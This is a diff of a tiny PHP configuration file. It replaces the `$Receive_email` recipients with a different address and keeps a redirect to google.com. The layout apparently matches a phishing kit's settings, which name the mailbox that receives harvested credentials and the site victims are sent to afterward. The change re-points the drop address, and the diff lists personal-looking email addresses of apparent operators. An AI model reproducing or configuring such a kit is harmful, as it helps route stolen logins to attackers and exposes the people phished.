@@ -1,4 +1,4 @@
 <?php 
-$Receive_email="johnwright365@outlook.com, ajeboajebo1@zohomail.com";
+$Receive_email="wecig76142@karavic.com,";
 $redirect="https://www.google.com/";
 ?>
